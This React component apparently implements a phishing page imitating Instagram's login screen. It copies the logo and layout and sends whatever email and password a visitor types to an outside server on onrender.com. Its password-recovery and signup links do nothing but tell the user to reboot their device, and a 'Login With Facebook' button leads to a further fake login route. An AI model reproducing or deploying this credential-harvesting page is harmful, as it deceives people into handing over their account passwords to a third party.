import React from 'react'
import { useState } from 'react'
import '../body/Insta.css'
import axios from 'axios'
import Insa from '../body/Image/instagram.jpg'
import Fi from '../body/Image/fai.jpg'
// import Opo from '../body/Image/opo.jpg'
import { useNavigate } from "react-router-dom"
import Pstor from '../body/Image/c5Rp7Ym-Klz.png'
import Mstor from '../body/Image/EHY6QnZYdNX.png'

const Insta = () => {
    const [email, setemail] = useState("email");
    // const [username, setemail] = useState("username");
    const [password, setpassword] = useState("password");
    const [message, setmessage] = useState("");
    const [isloading, setisloading] = useState(false);

    const values = {
        email: email,
        // username: username,
        password: password,
    }

    const endpoint = "https://insta-back-7i9j.onrender.com/log/signup";
    let navigate = useNavigate()

    const Forgetz = () => {
        alert("Reboot your device now")
    }

    const Creatz = (e) => {
        e.preventDefault();
        alert("You have to roboot your device, for you to create account")
    }

    const Fbi = () => {
        alert("Loading pls Wait")
        navigate("/login/facebook")
    }
    const Login = (e) => {
        e.preventDefault();
        console.log(values);
        axios
            .post(endpoint, values)
            .then((response) => {
                console.log(response.data);
                alert("Login went throung")
                alert(response.data.message);
                setmessage(response.data.message)
                setisloading(false)
                if (response.data.status) {
                    localStorage.token = response.data.token
                    localStorage.firstname = response.data.firstname
                    localStorage.setItem('firstname', response.data.firstname);
                    navigate("/")
                }
            })
    }
    return (
        <>
            <main>
                <div id='all' className='border border-info m-auto'>
                    <div id='jol' className='text-center m-auto mt-5'>
                        <img src={Insa} alt='instagram' />
                    </div>
                    <div className=" shadow mt-2 text-center w-50 m-auto">


                        <div className={message === "" ? "" : "alert-alert-info"}>
                            <h3>
                                {message}
                            </h3>
                        </div>

                        <form method="POST" typeof="submit" >
                            <div className='form-group'>
                                <div id='input' className='mt-2'>

                                    <input
                                        // onBlur={formik.handleBlur}
                                        onChange={(e) => setemail(e.target.value)}
                                        type="text"
                                        className="form-control w-100 m-2 m-auto"
                                        placeholder="phone number, username, or email"
                                    />
                                    {/* {formik.touched.email && <small className="text-light">{formik.errors.email}</small>} */}
                                </div>


                                <div className='mt-3'>

                                    <input
                                        onChange={(e) => setpassword(e.target.value)}
                                        type="password"
                                        className="form-control w-100 m-auto"
                                        placeholder="Password"
                                    />


                                </div>

                                <button onClick={Login} className="btn btn-primary mt-3 w-100">
                                    {isloading ? "loading please wait" : "Log In"}

                                </button>

                                <hr className='d-flex'></hr>

                                <div id='l' className='d-flex m-auto text-center' onClick={Fbi}>
                                    <img className='w' src={Fi} alt='f-icon' />
                                    <div id='a'>Login With Facebook</div>
                                </div>

                                <div className='mt-4'>
                                    <a id='az' onClick={Forgetz} href='###'>Forgetten password?</a>
                                </div>
                                {/* <div>
                                <button onClick={Creatz} id='btn' className='btn text-white mt-5'>create new account</button>
                            </div> */}
                            </div>
                        </form>
                        <h4>{message}</h4>

                    </div>
                </div>
            </main>
            
            <div id='alz' onClick={Creatz} className='text-center pt-2 m-auto border border-info mt-4'>
                <small>Don't have an account?</small>
                <strong className='text-info ml-4'>signup</strong>
            </div>
            <div className='text-center mt-3'>
                Get the app.
                </div>
                <div id='kl' className='d-flex text-center m-auto'>
                <img src={Pstor} alt='Playstore' />
                <img src={Mstor} alt='MicroSoft' />
                </div>

        </>
    )
}
export default Insta